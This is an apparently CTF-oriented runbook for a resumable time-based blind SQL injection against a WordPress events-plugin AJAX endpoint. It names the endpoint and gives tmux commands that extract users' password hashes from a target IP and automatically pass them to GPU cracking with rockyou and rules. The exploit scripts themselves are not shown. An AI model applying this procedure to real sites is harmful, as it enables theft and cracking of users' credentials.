# Resumable WordPress SQLi Method (Timing Blind)

Use this when target/VPN is unstable and you need checkpointed extraction.

## Files
- `extract_id_loop.py`: resilient ID hash extractor (checkpoint + retry loop).
- `mec_id_extract_once.py`: single-run extractor variant.
- `ctfvpn_stale_guard.sh`: VPN supervisor with stale detection + forced restart.
- `auto_crack_on_complete.sh`: waits for completed hash then starts GPU cracking on `<CRACK_NODE_ID>`.
- `start_id_method.sh`: starts extractor + auto-crack watcher for a given user ID.

## Preconditions
- Vulnerable endpoint reachable:
  - `/wordpress/wp-admin/admin-ajax.php?action=mec_load_single_page&time=...`
- Local VPN config exists at `${CTF_ROOT}/ctf.ovpn`.
- `tmux` installed.
- GPU crack host reachable (`<CRACK_NODE_ID>`) — see `README.md § GPU Cracking Nodes` for SSH details.

## 1) Start VPN stale-guard in tmux
```bash
tmux kill-session -t ctfvpn 2>/dev/null || true
tmux new-session -d -s ctfvpn '${CTF_ROOT}/methods/sqli_resumable_wordpress/ctfvpn_stale_guard.sh'
```

## 2) Start ID extraction + auto-crack
```bash
bash ${CTF_ROOT}/methods/sqli_resumable_wordpress/start_id_method.sh 2 10.66.179.145
```
For more users:
```bash
bash ${CTF_ROOT}/methods/sqli_resumable_wordpress/start_id_method.sh 3 10.66.179.145
bash ${CTF_ROOT}/methods/sqli_resumable_wordpress/start_id_method.sh 4 10.66.179.145
```

## 3) Monitor
```bash
tmux attach -t ctf-id2
tmux attach -t ctf-id2-autocrack
```
Checkpoint/log outputs:
- `${CTF_ROOT}/extract/id2.hash`
- `${CTF_ROOT}/extract/id2_extract.log`

## 4) Crack flow (automatic)
When hash length reaches 34 chars, `auto_crack_on_complete.sh` will:
1. stage hash in shared drop path under `${SECOPS_SHARED_ROOT}/droppoints/ctf-crack/`;
2. launch `tmux` crack session on `<CRACK_NODE_ID>` named `mtn-crack-id<ID>`;
3. run rockyou + rule stages and stop on hit.

## Notes
- Keep only one extractor per ID.
- Time-based extraction may pause for minutes during instability; checkpointing avoids loss.
- Prefer extracting additional IDs if one hash resists cracking.
